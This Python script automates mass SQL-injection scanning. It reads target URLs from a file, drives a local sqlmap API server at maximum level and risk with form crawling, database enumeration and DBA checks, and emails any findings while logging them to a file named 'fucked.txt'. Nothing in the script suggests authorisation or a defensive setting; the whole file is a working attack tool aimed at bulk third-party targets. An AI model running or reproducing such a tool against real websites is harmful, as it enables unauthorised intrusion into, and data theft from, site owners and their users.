from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import json
import time
from sendmail import mail

failflag = """{
    "success": true,
    "data": [],
    "error": []
}"""

def sqlmapapi(url):
    data = {
        "url": url,
        "threads": 10,
        "technique": "BEUQS",
        "crawl": "2",
        "randomAgent": True,
        "timeout": 20,
        "batch": True,
        "isDba": True,
        "dbs": True,
        "level": 5,
        "risk": 3,
        "forms": True
    }
    header = {'Content-Type': 'application/json'}

    try:
        task_new_url = "http://127.0.0.1:8775/task/new"
        res = requests.get(task_new_url)
        taskId = res.json()['taskid']

        if res.json().get("success"):
            print(f"[I] SQLMAP任务创建成功 - {url}")

            task_set_url = f'http://127.0.0.1:8775/option/{taskId}/set'
            requests.post(task_set_url, data=json.dumps(data), headers=header)

            task_start_url = f'http://127.0.0.1:8775/scan/{taskId}/start'
            requests.post(task_start_url, data=json.dumps(data), headers=header)

            while True:
                task_status_url = f'http://127.0.0.1:8775/scan/{taskId}/status'
                status = requests.get(task_status_url).json()

                if status.get('status') == 'running':
                    print(f"[I] {url} 扫描中...")
                    time.sleep(3)
                else:
                    task_data_url = f'http://127.0.0.1:8775/scan/{taskId}/data'
                    result = requests.get(task_data_url).text

                    if result.strip() == failflag.strip():
                        print(f"[-] {url} 没有发现SQL注入")
                    else:
                        print(f"[+] {url} 发现SQL注入漏洞！发送邮件中")
                        mail(url, result)
                        with open("fucked.txt", "a") as f:
                            f.write(result + "\n")
                    break
        else:
            print(f"[ERROR] 任务创建失败: {url}")
    except Exception as e:
        print(f"[ERROR] {url} 扫描异常: {e}")

def process_urls_from_file(file_name, max_workers=5):
    with open(file_name, 'r') as file:
        urls = [line.strip() for line in file if line.strip()]

    print(f"[INFO] 共发现 {len(urls)} 个URL，开始并发扫描（最大并发数 {max_workers}）")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(sqlmapapi, url) for url in urls]
        for future in as_completed(futures):
            pass  # 可以在这里添加处理完成后的日志

if __name__ == "__main__":
    process_urls_from_file("filtered_urls.txt", max_workers=5)
